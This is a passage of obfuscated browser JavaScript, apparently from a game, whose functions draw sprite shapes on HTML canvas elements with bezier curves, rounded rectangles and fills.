Δ.bezierCurveTo(ᐃ * 13.23297119140625, ᐃ * 267.8039855957031, 19.23297119140625 * ᐃ, 79.80398559570312 * ᐃ, 143.23297119140625 * ᐃ, ᐃ * 50.803985595703125), Δ.bezierCurveTo(175.23297119140625 * ᐃ, 41.803985595703125 * ᐃ, ᐃ * 263.23297119140625, ᐃ * 51.803985595703125, ᐃ * 285.23297119140625, 51.803985595703125 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[0])) : (Ⲇⵠ.width = 543 * ᐃ, Ⲇⵠ.height = 470 * ᐃ, Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(492.23297119140625 * ᐃ, ᐃ * 170.0767059326172), Δ.bezierCurveTo(ᐃ * 493.23297119140625, ᐃ * 300.16761779785156, ᐃ * 411.23297119140625, ᐃ * 382.16761779785156, ᐃ * 321.23297119140625, ᐃ * 419.16761779785156), Δ.bezierCurveTo(ᐃ * 251.23297119140625, 444.16761779785156 * ᐃ, 125.23297119140625 * ᐃ, 422.16761779785156 * ᐃ, ᐃ * 63.23297119140625, 347.16761779785156 * ᐃ), Δ.bezierCurveTo(ᐃ * 22.23297119140625, 282.16761779785156 * ᐃ, 53.23297119140625 * ᐃ, 152.16761779785156 * ᐃ, 179.23297119140625 * ᐃ, 79.16761779785156 * ᐃ), Δ.bezierCurveTo(237.23297119140625 * ᐃ, ᐃ * 46.16761779785156, 326.23297119140625 * ᐃ, 27.167617797851562 * ᐃ, 409.23297119140625 * ᐃ, ᐃ * 50.16761779785156), Δ.bezierCurveTo(ᐃ * 470.23297119140625, ᐃ * 66.16761779785156, 493.23297119140625 * ᐃ, ᐃ * 104.16761779785156, 492.23297119140625 * ᐃ, 170.0767059326172 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]));
			return Ⲇⵠ
		}

		function ΔⲆⵠⵠᐃΔΔ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 218 * ᐃ;
			Ⲇⵠ.height = 185 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 64, 53.135406494140625 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, 17.135406494140625 * ᐃ, ᐃ * 116, ᐃ * 11.135406494140625, ᐃ * 158, 53.135406494140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 178, 74.13540649414062 * ᐃ, 181 * ᐃ, 81.13540649414062 * ᐃ, ᐃ * 196, 101.13540649414062 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 214, ᐃ * 127.13540649414062, ᐃ * 192, ᐃ * 138.13540649414062, ᐃ * 173, 149.13540649414062 * ᐃ);
			Δ.bezierCurveTo(137 * ᐃ, ᐃ * 166.13540649414062, 74 * ᐃ, ᐃ * 170.13540649414062, 36 * ᐃ, 141.13540649414062 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠΔΔⲆΔΔΔ, ᐃ * 127.13540649414062, ᐃ * ᐃⲆᐃΔⵠ, ᐃ * 119.13540649414062, 30 * ᐃ, 103.13540649414062 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 71.13540649414062, 54 * ᐃ, ᐃ * 67.13540649414062, 63 * ᐃ, ᐃ * 54.135406494140625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(107 * ᐃ, 25.135406494140625 * ᐃ);
			Δ.bezierCurveTo(62 * ᐃ, ᐃ * 90.13540649414062, ᐃ * 54, 129.13540649414062 * ᐃ, 53 * ᐃ, ᐃ * 151.13540649414062);
			Δ.bezierCurveTo(ᐃ * 39.5, 142.13540649414062 * ᐃ, 39.5 * ᐃ, ᐃ * 142.13540649414062, 26 * ᐃ, ᐃ * 133.13540649414062);
			Δ.bezierCurveTo(23.5 * ᐃ, ᐃ * 128.63540649414062, ᐃ * 23.5, 128.63540649414062 * ᐃ, ᐃ * 21, 124.13540649414062 * ᐃ);
			Δ.bezierCurveTo(22 * ᐃ, ᐃ * 113.13540649414062, 31 * ᐃ, 99.13540649414062 * ᐃ, ᐃ * 40, ᐃ * 88.13540649414062);
			Δ.bezierCurveTo(ᐃ * 54.5, ᐃ * 67.13540649414062, 54.5 * ᐃ, ᐃ * 67.13540649414062, ᐃ * 69, ᐃ * 46.135406494140625);
			Δ.bezierCurveTo(ᐃ * 80.5, ᐃ * 36.635406494140625, ᐃ * 80.5, ᐃ * 36.635406494140625, ᐃ * 92, ᐃ * 27.135406494140625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			return Ⲇⵠ
		}

		function ⲆᐃΔᐃΔⵠᐃ(ΔⲆΔⲆⵠⵠᐃ, ᐃⵠⲆᐃⲆ, ⵠᐃⵠᐃΔ, ⵠⲆⵠᐃⵠⲆᐃ, ΔΔᐃⵠⵠⵠⵠ, ᐃⲆⵠΔⲆⵠᐃ) {
			const ⲆⲆΔᐃⲆᐃⵠᐃⲆ = (ᐃⵠᐃᐃⵠ << (ΔⲆΔⲆⵠⵠᐃ >> 0 & 255)) + (24 << (ΔⲆΔⲆⵠⵠᐃ >> 24 & 255)) + (16 << (ΔⲆΔⲆⵠⵠᐃ >> 8 & 255)) + (0 << (ΔⲆΔⲆⵠⵠᐃ >> ΔΔᐃᐃⲆ & 255));
			const ⵠΔⲆΔⵠⵠⲆᐃⲆ = (7049 | ᐃⵠⲆᐃⲆ) & ~(7049 & ᐃⵠⲆᐃⲆ);
			const ᐃⲆⵠᐃᐃⲆᐃⲆᐃ = ~(ⵠᐃⵠᐃΔ & 26012) & (26012 | ⵠᐃⵠᐃΔ);
			const ᐃΔⵠΔⵠⲆⲆᐃᐃ = (1013904223 + (60640 + ⵠⲆⵠᐃⵠⲆᐃ) * 1664525) % 4294967296;
			const ᐃΔⵠⵠⵠΔΔᐃᐃ = ~(41997 & ΔΔᐃⵠⵠⵠⵠ) & 41997 | ~(41997 & ΔΔᐃⵠⵠⵠⵠ) & ΔΔᐃⵠⵠⵠⵠ;
			const ΔᐃⵠΔᐃⵠⵠΔⲆ = (24 << (ᐃⲆⵠΔⲆⵠᐃ >> 8 & 255)) + (0 << (ᐃⲆⵠΔⲆⵠᐃ >> 0 & ⲆΔⵠᐃⵠᐃⵠ)) + (ᐃⲆᐃᐃΔ << (ᐃⲆⵠΔⲆⵠᐃ >> ΔΔᐃᐃΔ & 255)) + (8 << (ᐃⲆⵠΔⲆⵠᐃ >> 24 & 255));
			const ⲆᐃΔᐃⲆⵠⲆ = ΔᐃⵠⲆᐃⲆᐃ(ⲆⲆΔᐃⲆᐃⵠᐃⲆ, ⵠΔⲆΔⵠⵠⲆᐃⲆ);
			const ΔⲆΔⲆⲆᐃᐃᐃⵠ = ΔᐃⵠⲆᐃⲆᐃ(ᐃⲆⵠᐃᐃⲆᐃⲆᐃ, ᐃΔⵠΔⵠⲆⲆᐃᐃ);
			const ⲆⵠⲆΔⵠΔⲆⵠⲆ = ~(5317 & ⲆᐃΔᐃⲆⵠⲆ) & ⲆᐃΔᐃⲆⵠⲆ | ~(ⲆᐃΔᐃⲆⵠⲆ & 5317) & 5317;
			return ⲆⵠⲆΔⵠΔⲆⵠⲆ
		}

		function ⵠΔΔⵠΔᐃⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 163;
			Ⲇⵠ.height = ᐃ * 163;
			Δ.save();
			Δ.translate(82.5 * ᐃ, 81.1015625 * ᐃ);
			Δ.rotate(ᐃⵠΔ);
			Ⲇᐃᐃ(Δ, ᐃ * -65.5, -66 * ᐃ, ᐃ * 131, 131 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆΔ]);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ⵠᐃⲆΔ * ᐃ, ΔⲆΔΔ * ᐃ);
			Δ.save();
			Δ.translate(80 * ᐃ, 17.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, -64 * ᐃ, -4.5 * ᐃ, 129 * ᐃ, ᐃ * ⲆⵠⲆⲆⲆ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -5, -5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 80, 17.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, -64 * ᐃ, ᐃ * -4.5, ᐃ * 129, ΔⵠᐃΔΔΔⵠ * ᐃ, ᐃᐃⲆᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ], Ⲇᐃ[3], ᐃ * 3);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ⵠⲆⵠⵠ * ᐃ, ᐃ * ΔⵠⲆⲆ);
			Δ.save();
			Δ.translate(ᐃ * 145.5, 83.6015625 * ᐃ);
			Ⲇᐃᐃ(Δ, -4.5 * ᐃ, -61 * ᐃ, 9 * ᐃ, ᐃ * 129, ᐃ * ΔᐃΔⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -5, ᐃ * -ΔΔᐃⲆ);
			Δ.save();
			Δ.translate(ᐃ * 145.5, ᐃ * 83.6015625);
			Ⲇᐃᐃ(Δ, ᐃ * -4.5, ᐃ * -61, ᐃ * Ⲇᐃⵠⵠⵠ, ᐃ * 129, ᐃ * ᐃⲆⵠΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃⲆΔⵠ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(5 * ᐃ, 5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 17.5, 82.6015625 * ᐃ);
			Ⲇᐃᐃ(Δ, -4.5 * ᐃ, ᐃ * -65, ⵠⲆΔⵠⵠ * ᐃ, 129 * ᐃ, ⵠⵠΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔᐃᐃⲆ;
			Δ.translate(ᐃ * -5, -ᐃⲆⵠΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 17.5, ᐃ * 82.6015625);
			Ⲇᐃᐃ(Δ, ᐃ * -4.5, -65 * ᐃ, ᐃ * Ⲇᐃⵠⵠⵠ, 129 * ᐃ, ᐃ * ⵠⵠΔΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ], Ⲇᐃ[ΔⲆΔᐃ], ⲆᐃΔᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * ᐃⲆⵠΔ, ᐃ * ΔΔᐃⲆ);
			Δ.save();
			Δ.translate(80.5 * ᐃ, ᐃ * 145.6015625);
			Ⲇᐃᐃ(Δ, -65.5 * ᐃ, ᐃ * -ⲆⲆⲆΔ, ᐃ * 129, ᐃ * 9, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = ΔᐃⲆⵠ;
			Δ.translate(ᐃ * -5, -ⵠᐃΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 80.5, ᐃ * 145.6015625);
			Ⲇᐃᐃ(Δ, ᐃ * -65.5, ᐃ * -ⲆⲆⲆΔ, ᐃ * 129, 9 * ᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ⵠⵠⵠᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(5 * ᐃ, 5 * ᐃ);
			Δ.save();
			Δ.translate(17 * ᐃ, 18.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -ⵠᐃⲆΔᐃᐃᐃ, ᐃ * -11.5, 22 * ᐃ, 22 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔΔ;
			Δ.translate(ᐃ * -5, ᐃ * -ⵠⵠΔΔ);
			Δ.save();
			Δ.translate(ᐃ * ΔΔΔᐃᐃⵠΔ, ᐃ * 18.1015625);
			Ⲇᐃᐃ(Δ, -ⵠᐃⲆΔᐃᐃᐃ * ᐃ, -11.5 * ᐃ, 22 * ᐃ, 22 * ᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ⵠᐃⵠⲆ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * 5, ᐃ * ⵠᐃⲆΔ);
			Δ.save();
			Δ.translate(ᐃ * 145.5, 16.6015625 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -10.5, -11.5 * ᐃ, 21 * ᐃ, ᐃ * 22, ⵠⲆⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔΔ;
			Δ.translate(ᐃ * -5, -5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 145.5, ᐃ * 16.6015625);
			Ⲇᐃᐃ(Δ, ᐃ * -10.5, -11.5 * ᐃ, 21 * ᐃ, 22 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠᐃⲆ], Ⲇᐃ[3], ⲆᐃΔᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⵠΔⵠ;
			Δ.translate(ᐃΔΔⲆ * ᐃ, ⲆⲆΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(145.5 * ᐃ, 144.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -10.5, ᐃ * -ΔΔΔΔⲆⵠⲆ, ᐃ * 22, 22 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -ᐃⲆⵠΔ, -5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 145.5, 144.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, -10.5 * ᐃ, -11 * ᐃ, ᐃ * 22, 22 * ᐃ, ⵠⲆᐃᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃⵠ], Ⲇᐃ[ⵠⲆΔⵠΔ], Δⵠᐃⵠ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * 5, ᐃ * 5);
			Δ.save();
			Δ.translate(ᐃ * 17.5, 145.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -11.5, -12 * ᐃ, 22 * ᐃ, ᐃ * 22, ᐃ * ᐃⲆⵠΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(-5 * ᐃ, -ᐃⲆⵠⵠ * ᐃ);
			Δ.save();
			Δ.translate(17.5 * ᐃ, 145.1015625 * ᐃ);
			Ⲇᐃᐃ(Δ, -11.5 * ᐃ, -12 * ᐃ, 22 * ᐃ, 22 * ᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * 3);
			return Ⲇⵠ
		}

		function ᐃⲆΔⲆᐃᐃᐃⲆΔ() {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 460;
			Ⲇⵠ.height = 220;
			Δ.fillStyle = "#3a2a0d";
			Δ.fillRect(ᐃⵠⲆⵠ, ⵠᐃⲆᐃ, Ⲇⵠ.width, Ⲇⵠ.height);
			Δ.lineWidth = 4;
			Δ.beginPath();
			Δ.strokeStyle = "#513810";
			for (var ⲆⵠⲆ = ⵠΔΔⲆᐃ; 220 > ⲆⵠⲆ; ⲆⵠⲆ += ⵠⲆⲆⲆⲆ) {
				Δ.moveTo(0, ⲆⵠⲆ);
				Δ.lineTo(460, ⲆⵠⲆ);
				Δ.closePath();
				Δ.stroke()
			}
			return Ⲇⵠ
		}

		function ⲆⵠΔⲆⵠΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 168;
			Ⲇⵠ.height = ᐃ * 100;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃᐃⲆⵠⵠ * ᐃ, ᐃ * 5);
			Δ.save();
			Δ.translate(ᐃ * 24.5, ᐃ * 44.30000305175781);
			Ⲇᐃᐃ(Δ, ᐃ * -19.5, ᐃ * -8.5, 39 * ᐃ, ᐃ * ⲆⵠᐃΔᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(115 * ᐃ, 37.80000305175781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142, ᐃ * 37.80000305175781, 140 * ᐃ, ᐃ * 37.80000305175781, 141 * ᐃ, 37.80000305175781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, ᐃ * 28.800003051757812, ᐃ * 149, 26.800003051757812 * ᐃ, 153 * ᐃ, ᐃ * 32.80000305175781);
			Δ.bezierCurveTo(ᐃ * 160, ᐃ * 42.80000305175781, ᐃ * 157, ᐃ * 50.80000305175781, 153 * ᐃ, ᐃ * 58.80000305175781);
			Δ.bezierCurveTo(ᐃ * 148, 62.80000305175781 * ᐃ, 147 * ᐃ, ᐃ * 59.80000305175781, ᐃ * 143, ᐃ * 52.80000305175781);
			Δ.bezierCurveTo(ᐃ * 129, ᐃ * 52.80000305175781, 129 * ᐃ, 52.80000305175781 * ᐃ, 115 * ᐃ, ᐃ * 52.80000305175781);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			ⵠᐃᐃ(Δ, 78 * ᐃ, 44.80000305175781 * ᐃ, ᐃ * 39.44616584663204);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ᐃᐃⲆΔ;
			Δ.translate(-10 * ᐃ, ᐃ * -5);
			Δ.save();
			Δ.translate(24.5 * ᐃ, 44.30000305175781 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -19.5, -8.5 * ᐃ, 39 * ᐃ, ⵠᐃⵠⲆⲆ * ᐃ, ⲆⵠⲆᐃⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[ⵠΔΔΔΔ], ᐃ * ⵠᐃΔⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 115, 37.80000305175781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142, ᐃ * 37.80000305175781, 140 * ᐃ, 37.80000305175781 * ᐃ, ᐃ * 141, 37.80000305175781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, 28.800003051757812 * ᐃ, 149 * ᐃ, ᐃ * 26.800003051757812, 153 * ᐃ, ᐃ * 32.80000305175781);
			Δ.bezierCurveTo(160 * ᐃ, 42.80000305175781 * ᐃ, ᐃ * 157, 50.80000305175781 * ᐃ, 153 * ᐃ, ᐃ * 58.80000305175781);
			Δ.bezierCurveTo(ᐃ * 148, 62.80000305175781 * ᐃ, ᐃ * 147, ᐃ * 59.80000305175781, 143 * ᐃ, 52.80000305175781 * ᐃ);
			Δ.bezierCurveTo(129 * ᐃ, 52.80000305175781 * ᐃ, ᐃ * 129, 52.80000305175781 * ᐃ, 115 * ᐃ, ᐃ * 52.80000305175781);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[3], ᐃ * Δⵠᐃᐃⵠ);
			ⵠᐃᐃ(Δ, 78 * ᐃ, ᐃ * 44.80000305175781, ᐃ * 42.44616584663204);
			ΔⲆ(Δ, undefined, Ⲇᐃ[3], ᐃ * ⲆᐃⲆᐃ);
			Δ.save();
			Δ.translate(ᐃ * 24.5, 44.30000305175781 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -19.5, -8.5 * ᐃ, ᐃ * 39, ᐃ * ⵠᐃᐃΔᐃ, ᐃ * ⲆⲆⲆΔᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 115, ᐃ * 37.80000305175781);
			Δ.bezierCurveTo(142 * ᐃ, 37.80000305175781 * ᐃ, 140 * ᐃ, ᐃ * 37.80000305175781, ᐃ * 141, 37.80000305175781 * ᐃ);
			Δ.bezierCurveTo(147 * ᐃ, ᐃ * 28.800003051757812, ᐃ * 149, 26.800003051757812 * ᐃ, 153 * ᐃ, 32.80000305175781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 160, 42.80000305175781 * ᐃ, ᐃ * 157, ᐃ * 50.80000305175781, 153 * ᐃ, 58.80000305175781 * ᐃ);
			Δ.bezierCurveTo(148 * ᐃ, 62.80000305175781 * ᐃ, 147 * ᐃ, 59.80000305175781 * ᐃ, ᐃ * 143, 52.80000305175781 * ᐃ);
			Δ.bezierCurveTo(129 * ᐃ, ᐃ * 52.80000305175781, ᐃ * 129, 52.80000305175781 * ᐃ, ᐃ * 115, 52.80000305175781 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 78, ᐃ * 44.80000305175781, 39.44616584663204 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ], Ⲇᐃ[1], ᐃ * 4);
			ⵠᐃᐃ(Δ, 78 * ᐃ, ᐃ * 44.80000305175781, 29.68164415931166 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃ * 4);
			ⵠᐃᐃ(Δ, 78 * ᐃ, 44 * ᐃ, ᐃ * ᐃⲆᐃΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			return Ⲇⵠ
		}

		function ΔΔⲆΔⵠᐃᐃ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 81 * ᐃ;
			Ⲇⵠ.height = ᐃ * 77;
			Δ.translate(ΔⲆⵠⲆ, 10 * ᐃ);
			Δ.scale(.2, .2);
			Δ.translate(Δᐃᐃⵠ, -30 * ᐃ);
			if (ⵠᐃ == ⵠΔᐃ) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 36.5, ᐃ * 278.0625);
				Δ.bezierCurveTo(67.5 * ᐃ, ᐃ * 316.0625, 134.5 * ᐃ, ᐃ * 334.0625, 199.5 * ᐃ, 319.0625 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 254.5, 304.0625 * ᐃ, 346.5 * ᐃ, 270.0625 * ᐃ, 348.5 * ᐃ, 237.0625 * ᐃ);
				Δ.bezierCurveTo(359.5 * ᐃ, ᐃ * 206.0625, 318.5 * ᐃ, 129.0625 * ᐃ, ᐃ * 262.5, ᐃ * 122.0625);
				Δ.bezierCurveTo(ᐃ * 213.5, 115.0625 * ᐃ, 166.5 * ᐃ, ᐃ * 133.0625, ᐃ * 104.5, 166.0625 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 54.5, 194.0625 * ᐃ, 23.5 * ᐃ, 241.0625 * ᐃ, ᐃ * 36.5, ᐃ * 277.0625);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆΔᐃ], ᐃ * 50)
			}
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 36.5, ᐃ * 278.0625);
			Δ.bezierCurveTo(ᐃ * 67.5, 316.0625 * ᐃ, 134.5 * ᐃ, 334.0625 * ᐃ, 199.5 * ᐃ, 319.0625 * ᐃ);
			Δ.bezierCurveTo(254.5 * ᐃ, 304.0625 * ᐃ, ᐃ * 346.5, 270.0625 * ᐃ, 348.5 * ᐃ, ᐃ * 237.0625);
			Δ.bezierCurveTo(ᐃ * 359.5, ᐃ * 206.0625, ᐃ * 318.5, 129.0625 * ᐃ, 262.5 * ᐃ, ᐃ * 122.0625);
			Δ.bezierCurveTo(213.5 * ᐃ, ᐃ * 115.0625, 166.5 * ᐃ, ᐃ * 133.0625, 104.5 * ᐃ, ᐃ * 166.0625);
			Δ.bezierCurveTo(ᐃ * 54.5, 194.0625 * ᐃ, ᐃ * 23.5, 241.0625 * ᐃ, 36.5 * ᐃ, ᐃ * 277.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ΔΔΔ], ᐃ * 19);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(214.5 * ᐃ, ᐃ * 124.0625);
			Δ.bezierCurveTo(ᐃ * 242.5, 125.0625 * ᐃ, ᐃ * 272.5, 159.0625 * ᐃ, ᐃ * 283.5, 184.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 277.5, ᐃ * 161.0625, ᐃ * 233.5, ᐃ * 128.0625, ᐃ * 219.5, ᐃ * 122.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[ΔⲆᐃᐃ], ᐃ * ⲆᐃⲆⲆⲆΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 157.5, ᐃ * 145.0625);
			Δ.bezierCurveTo(176.5 * ᐃ, 148.0625 * ᐃ, 205.5 * ᐃ, 176.0625 * ᐃ, 212.5 * ᐃ, ᐃ * 197.0625);
			Δ.bezierCurveTo(205.5 * ᐃ, ᐃ * 178.0625, ᐃ * 177.5, ᐃ * 152.0625, 156.5 * ᐃ, 142.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔᐃⲆⵠ], ᐃ * ᐃΔⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(103.5 * ᐃ, 169.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 160.5, ᐃ * 166.0625, ᐃ * 228.5, ᐃ * 312.0625, 162.5 * ᐃ, 323.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128.5, 330.0625 * ᐃ, ᐃ * 45.5, ᐃ * 312.0625, ᐃ * 34.5, 268.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30.5, 238.0625 * ᐃ, ᐃ * 44.5, 222.0625 * ᐃ, ᐃ * 52.5, 211.0625 * ᐃ);
			Δ.bezierCurveTo(82.5 * ᐃ, 174.0625 * ᐃ, 104.5 * ᐃ, 166.0625 * ᐃ, ᐃ * 119.5, ᐃ * 172.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔΔ], Ⲇᐃ[1], 19 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 194.5, 313.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 222.5, ᐃ * 306.0625, ᐃ * 319.5, 271.0625 * ᐃ, 337.5 * ᐃ, 241.0625 * ᐃ);
			Δ.bezierCurveTo(274.5 * ᐃ, ᐃ * 270.0625, ᐃ * 216.5, ᐃ * 288.0625, 199.5 * ᐃ, 287.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 198.5, ᐃ * 302.0625, ᐃ * 195.5, 311.0625 * ᐃ, ᐃ * 193.5, 312.0625 * ᐃ);
			Δ.closePath();
